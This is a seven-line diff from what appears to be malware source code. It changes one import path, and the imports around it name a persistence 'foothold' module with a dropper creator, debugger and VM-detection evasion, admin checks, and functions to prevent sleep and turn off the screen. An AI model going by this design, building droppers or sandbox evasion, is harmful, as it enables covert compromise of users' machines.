@@ -1,7 +1,7 @@
 import sys
 from time import sleep
 from Persistance.foothold import get_pyinstaller,install_python,create_dropper
-from Utils.backup.helpers import is_python_exist,is_online,find_python_path,is_admin
+from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
 from threading import Thread
 from Evasion import debugEvasion,vmDetect
 from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
